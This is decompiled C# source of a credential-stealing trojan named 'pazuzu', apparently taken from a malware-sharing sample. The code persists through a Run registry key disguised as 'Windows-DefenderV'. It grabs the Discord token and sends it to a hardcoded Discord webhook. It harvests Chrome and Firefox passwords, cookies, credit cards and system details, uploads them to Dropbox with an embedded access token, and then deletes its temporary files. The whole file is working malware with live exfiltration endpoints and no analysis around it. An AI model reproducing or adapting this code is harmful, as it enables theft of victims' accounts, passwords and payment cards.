// Decompiled with JetBrains decompiler
// Type: pazuzu.Program
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using Dropbox.Api;
using Dropbox.Api.FileProperties;
using Dropbox.Api.Files;
using Dropbox.Api.Files.Routes;
using Microsoft.Win32;
using pazuzu.ChromiumBased;
using pazuzu.FireFox;
using pazuzu.Required;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace pazuzu
{
  internal class Program
  {
    private static string userName = Environment.UserName;
    private static string pathStartUp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static string token = "ygICSHW0uQUAAAAAAAAAAUmK7RcHCgOXDX-DU2Seeuln1dQ7ZkhYj3BP6NyD-24N";
    private static string youDiscordWebHook = "https://canary.discord.com/api/webhooks/847708089728630784/sunVRLeG1XrSUhdZugO3colKMeInOWriexBfHYjI_22Lg3dY_RvSATjR3QcXUrHiv4mX";

    private static void Main(string[] args)
    {
      string location = Assembly.GetExecutingAssembly().Location;
      string path = Path.Combine(Program.pathStartUp, Path.GetFileName(location));
      if (!File.Exists(path))
      {
        byte[] bytes = File.ReadAllBytes(location);
        File.WriteAllBytes(path, bytes);
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows-DefenderV", (object) path);
      }
      try
      {
        string stringx = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
        if (Program.dotldb(ref stringx) || Program.dotldb(ref stringx))
          ;
        Thread.Sleep(100);
        string str = Program.tokenx(stringx, stringx.EndsWith(".log"));
        if (str == "")
          str = "N/A";
        using (defender defender = new defender())
        {
          foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
          {
            managementBaseObject["Caption"].ToString();
            defender.ProfilePicture = "https://cdn.discordapp.com/attachments/779687033382764554/786566078012194836/photo_2020-12-10_17-40-54.jpg";
            defender.UserName = "Rachel❤Kingsman";
            defender.WebHook = Program.youDiscordWebHook;
            defender.SendMessage("```UserName: " + Environment.UserName + Environment.NewLine + "IP: None Token DiscordAPP: " + str + Environment.NewLine + "```");
          }
        }
      }
      catch (Exception ex)
      {
        string message = ex.Message;
      }
      new Thread((ThreadStart) (() => Program.CCpass())).Start();
      new Thread((ThreadStart) (() => Browser.ShowCookies(CCookies.Get()))).Start();
      new Thread((ThreadStart) (() => Browser.ShowCreditCards(CreditCards.Get()))).Start();
      foreach (IPassReader passReader in new List<IPassReader>()
      {
        (IPassReader) new FirefoxPassReader()
      })
      {
        try
        {
          Program.PrintCredentials(passReader.ReadPasswords());
        }
        catch (Exception ex)
        {
        }
      }
      new Thread((ThreadStart) (() => Program.FFCookies())).Start();
      if (!File.Exists("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\Info.zip"))
      {
        Systemsinfo.PcInfo();
        Systemsinfo.ProgProc();
        ZipArchive destination = ZipFile.Open("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\Info.zip", ZipArchiveMode.Create);
        string[] strArray = new string[2]
        {
          "C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\Programms.txt",
          "C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\Processes.txt"
        };
        foreach (string str in strArray)
          destination.CreateEntryFromFile(str, Path.GetFileName(str), CompressionLevel.Optimal);
        destination.Dispose();
      }
      try
      {
        using (new defender())
        {
          if (File.Exists("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CPass.txt"))
            Task.Run(new Func<Task>(Program.Run)).Wait();
          if (File.Exists("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_FFPass.txt"))
            Task.Run(new Func<Task>(Program.Run2)).Wait();
          if (File.Exists("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CCookies.txt"))
            Task.Run(new Func<Task>(Program.Run3)).Wait();
          if (File.Exists("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_FFCookies.txt"))
            Task.Run(new Func<Task>(Program.Run4)).Wait();
          if (File.Exists("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\Info.zip"))
            Task.Run(new Func<Task>(Program.Run6)).Wait();
        }
        if (File.Exists("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CCards.txt"))
          Task.Run(new Func<Task>(Program.Run5)).Wait();
        Thread.Sleep(2);
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CPass.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CCookies.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_FFPass.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_FFCookies.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CCards.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\Info.zip");
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.InnerException.Message);
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CPass.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CCookies.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_FFPass.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_FFCookies.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CCards.txt");
        File.Delete("C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\Info.zip");
      }
    }

    private static void CCpass()
    {
      List<Account> accountList = Chromium.Grab();
      string path = "C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_CPass.txt";
      foreach (Account account in accountList)
      {
        using (StreamWriter streamWriter = File.AppendText(path))
        {
          streamWriter.WriteLine("Url: " + account.URL);
          streamWriter.WriteLine("Username: " + account.UserName);
          streamWriter.WriteLine("Password: " + account.Password);
          streamWriter.WriteLine("Application: " + account.Application);
          streamWriter.WriteLine("Time: " + DateTime.Now.ToString());
          streamWriter.WriteLine("=============================");
        }
      }
    }

    private static void FFCookies()
    {
      string path = "C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_FFCookies.txt";
      foreach (string mozillaBrowser in Profile.GetMozillaBrowsers())
      {
        foreach (pazuzu.FireFox.Common.Cookie cCookie in Cookies.Get(mozillaBrowser))
        {
          using (StreamWriter streamWriter = File.AppendText(path))
            streamWriter.WriteLine(BrowserUtils.FormatCookie(cCookie));
        }
      }
    }

    private static async Task Run()
    {
      using (DropboxClient dbx = new DropboxClient(Program.token))
      {
        string userName = Environment.UserName;
        string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CPass.txt";
        string folder = "/" + userName;
        string filename = DateTime.Now.ToString() + "_CPass.txt";
        string url = "";
        using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
        {
          FilesUserRoutes files = dbx.Files;
          string str = folder + "/" + filename;
          WriteMode.Add instance = WriteMode.Add.Instance;
          Stream stream1 = (Stream) mem;
          DateTime? nullable = new DateTime?();
          Stream stream2 = stream1;
          Task<FileMetadata> updated = files.UploadAsync(str, (WriteMode) instance, false, nullable, false, (IEnumerable<PropertyGroup>) null, false, stream2);
          updated.Wait();
          updated = (Task<FileMetadata>) null;
        }
        Console.Write(url);
        userName = (string) null;
        file = (string) null;
        folder = (string) null;
        filename = (string) null;
        url = (string) null;
      }
      await Task.Yield();
    }

    private static async Task Run2()
    {
      using (DropboxClient dbx = new DropboxClient(Program.token))
      {
        string userName = Environment.UserName;
        string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFPass.txt";
        string folder = "/" + userName;
        string filename = DateTime.Now.ToString() + "_FFPass.txt";
        string url = "";
        using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
        {
          FilesUserRoutes files = dbx.Files;
          string str = folder + "/" + filename;
          WriteMode.Add instance = WriteMode.Add.Instance;
          Stream stream1 = (Stream) mem;
          DateTime? nullable = new DateTime?();
          Stream stream2 = stream1;
          Task<FileMetadata> updated = files.UploadAsync(str, (WriteMode) instance, false, nullable, false, (IEnumerable<PropertyGroup>) null, false, stream2);
          updated.Wait();
          updated = (Task<FileMetadata>) null;
        }
        Console.Write(url);
        userName = (string) null;
        file = (string) null;
        folder = (string) null;
        filename = (string) null;
        url = (string) null;
      }
      await Task.Yield();
    }

    private static async Task Run3()
    {
      using (DropboxClient dbx = new DropboxClient(Program.token))
      {
        string userName = Environment.UserName;
        string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCookies.txt";
        string folder = "/" + userName;
        string filename = DateTime.Now.ToString() + "_CCookies.txt";
        string url = "";
        using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
        {
          FilesUserRoutes files = dbx.Files;
          string str = folder + "/" + filename;
          WriteMode.Add instance = WriteMode.Add.Instance;
          Stream stream1 = (Stream) mem;
          DateTime? nullable = new DateTime?();
          Stream stream2 = stream1;
          Task<FileMetadata> updated = files.UploadAsync(str, (WriteMode) instance, false, nullable, false, (IEnumerable<PropertyGroup>) null, false, stream2);
          updated.Wait();
          updated = (Task<FileMetadata>) null;
        }
        Console.Write(url);
        userName = (string) null;
        file = (string) null;
        folder = (string) null;
        filename = (string) null;
        url = (string) null;
      }
      await Task.Yield();
    }

    private static async Task Run4()
    {
      using (DropboxClient dbx = new DropboxClient(Program.token))
      {
        string userName = Environment.UserName;
        string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFCookies.txt";
        string folder = "/" + userName;
        string filename = DateTime.Now.ToString() + "_FFCookies.txt";
        string url = "";
        using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
        {
          FilesUserRoutes files = dbx.Files;
          string str = folder + "/" + filename;
          WriteMode.Add instance = WriteMode.Add.Instance;
          Stream stream1 = (Stream) mem;
          DateTime? nullable = new DateTime?();
          Stream stream2 = stream1;
          Task<FileMetadata> updated = files.UploadAsync(str, (WriteMode) instance, false, nullable, false, (IEnumerable<PropertyGroup>) null, false, stream2);
          updated.Wait();
          updated = (Task<FileMetadata>) null;
        }
        Console.Write(url);
        userName = (string) null;
        file = (string) null;
        folder = (string) null;
        filename = (string) null;
        url = (string) null;
      }
      await Task.Yield();
    }

    private static async Task Run5()
    {
      using (DropboxClient dbx = new DropboxClient(Program.token))
      {
        string userName = Environment.UserName;
        string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCards.txt";
        string folder = "/" + userName;
        string filename = DateTime.Now.ToString() + "_CCards.txt";
        string url = "";
        using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
        {
          FilesUserRoutes files = dbx.Files;
          string str = folder + "/" + filename;
          WriteMode.Add instance = WriteMode.Add.Instance;
          Stream stream1 = (Stream) mem;
          DateTime? nullable = new DateTime?();
          Stream stream2 = stream1;
          Task<FileMetadata> updated = files.UploadAsync(str, (WriteMode) instance, false, nullable, false, (IEnumerable<PropertyGroup>) null, false, stream2);
          updated.Wait();
          updated = (Task<FileMetadata>) null;
        }
        Console.Write(url);
        userName = (string) null;
        file = (string) null;
        folder = (string) null;
        filename = (string) null;
        url = (string) null;
      }
      await Task.Yield();
    }

    private static async Task Run6()
    {
      using (DropboxClient dbx = new DropboxClient(Program.token))
      {
        string userName = Environment.UserName;
        string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Info.zip";
        string folder = "/" + userName;
        string filename = DateTime.Now.ToString() + "_Info.zip";
        string url = "";
        using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
        {
          FilesUserRoutes files = dbx.Files;
          string str = folder + "/" + filename;
          WriteMode.Add instance = WriteMode.Add.Instance;
          Stream stream1 = (Stream) mem;
          DateTime? nullable = new DateTime?();
          Stream stream2 = stream1;
          Task<FileMetadata> updated = files.UploadAsync(str, (WriteMode) instance, false, nullable, false, (IEnumerable<PropertyGroup>) null, false, stream2);
          updated.Wait();
          updated = (Task<FileMetadata>) null;
        }
        Console.Write(url);
        userName = (string) null;
        file = (string) null;
        folder = (string) null;
        filename = (string) null;
        url = (string) null;
      }
      await Task.Yield();
    }

    private static void PrintCredentials(IEnumerable<CredentialModel> data)
    {
      string path = "C:\\Users\\" + Program.userName + "\\AppData\\Local\\Temp\\" + Program.userName + "_FFPass.txt";
      foreach (CredentialModel credentialModel in data)
      {
        using (StreamWriter streamWriter = File.AppendText(path))
        {
          streamWriter.WriteLine(credentialModel.Url + "\r\n\tUsername: " + credentialModel.Username + "\r\n\tPassword: " + credentialModel.Password + "\r\n");
          streamWriter.WriteLine("Time: " + DateTime.Now.ToString());
          streamWriter.WriteLine("=============================");
        }
      }
    }

    private static bool dotlog(ref string stringx)
    {
      if (!Directory.Exists(stringx))
        return false;
      foreach (FileInfo file in new DirectoryInfo(stringx).GetFiles())
      {
        if (file.Name.EndsWith(".log") && File.ReadAllText(file.FullName).Contains("oken"))
        {
          stringx += file.Name;
          return stringx.EndsWith(".log");
        }
      }
      return stringx.EndsWith(".log");
    }

    private static string tokenx(string stringx, bool boolx = false)
    {
      string str1 = Encoding.UTF8.GetString(File.ReadAllBytes(stringx));
      string str2 = "";
      string stringx1 = str1;
      while (stringx1.Contains("oken"))
      {
        string[] strArray = Program.IndexOf(stringx1).Split('"');
        str2 = strArray[0];
        stringx1 = string.Join("\"", strArray);
        if (boolx && str2.Length == 59)
          break;
      }
      return str2;
    }

    private static bool dotldb(ref string stringx)
    {
      if (!Directory.Exists(stringx))
        return false;
      foreach (FileInfo file in new DirectoryInfo(stringx).GetFiles())
      {
        if (file.Name.EndsWith(".ldb") && File.ReadAllText(file.FullName).Contains("oken"))
        {
          stringx += file.Name;
          return stringx.EndsWith(".ldb");
        }
      }
      return stringx.EndsWith(".ldb");
    }

    private static string IndexOf(string stringx)
    {
      string[] collection = stringx.Substring(stringx.IndexOf("oken") + 4).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) collection);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }
  }
}
